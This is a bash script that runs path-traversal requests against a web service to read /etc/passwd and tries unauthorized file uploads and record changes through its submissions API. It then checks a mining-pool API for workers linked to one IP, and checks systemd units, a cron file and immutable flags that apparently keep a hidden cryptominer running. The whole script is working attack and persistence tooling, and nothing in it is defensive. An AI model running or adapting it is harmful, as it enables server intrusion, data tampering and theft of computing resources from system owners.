#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
B=http://192.168.0.24:18086; ID=HIJ-20261125-005939abe2b7
log "### START26 $(date -u +%FT%TZ)"
log "### STATIC-TRAV"
for p in "/downloads/../../../../etc/passwd" "/downloads/H/../../../../etc/passwd" "/downloads/H/" "/server_data/" "/../server_data/" "/api/submissions/$ID/files" "/api/submissions/$ID"; do
  printf "%s -> " "$p"; timeout 10 curl -s -m 8 -o /tmp/s.$$ -w "%{http_code} %{size_download} " "$B$p"; head -c 160 /tmp/s.$$ | tr '\n' ' '; echo
done
log "### FILES-JSON"
for body in \
 "{\"context\":\"H\",\"filename\":\"ul.txt\",\"content\":\"aGVsbG8=\"}" \
 "{\"context\":\"H\",\"filename\":\"ul.txt\",\"data\":\"aGVsbG8=\"}" \
 "{\"context\":\"H\",\"filename\":\"ul.txt\",\"content_b64\":\"aGVsbG8=\"}" \
 "{\"H\":{\"filename\":\"ul.txt\",\"content_b64\":\"aGVsbG8=\"}}" ; do
  printf "J %s -> " "$(echo "$body" | head -c 52)"; timeout 12 curl -s -m 10 -X POST "$B/api/submissions/$ID/files" -H 'Content-Type: application/json' -d "$body" -w " [%{http_code}]\n" | head -c 240; echo
done
log "### PUT-SUB"
timeout 12 curl -s -m 10 -X PUT "$B/api/submissions/$ID" -H 'Content-Type: application/json' -d '{"nickname":"ul2"}' -w " [%{http_code}]\n" | head -c 200
log "### POOL"
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
timeout 20 curl -s -m 15 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" | python3 -c "
import json,sys
n=0; t=0
for r in (json.load(sys.stdin).get('results') or []):
  w=str(r.get('worker',''))
  if '123-184-7-135' in w and 't2-' in w:
    n+=1; hs=float(r.get('avg_hashrate_30m') or 0); t+=hs
    print(w,r.get('status'),'valid=',r.get('valid'),'hs_TH=',round(hs/1e12,1))
print('ONLINE',n,'TOTAL_TX',round(t/1e12,1))
" 2>&1 | tail -10
log "### UNITS"
for i in 0 1 2 3 4 5 6 7; do printf 'g%d=%s ' $i "$(systemctl is-active ul-g$i)"; done; echo
systemctl is-active ul-guard.timer; ls -l /etc/cron.d/ulguard 2>/dev/null; lsattr /usr/local/bin/ul-g.sh 2>/dev/null
log "### DONE26 $(date -u +%FT%TZ)"
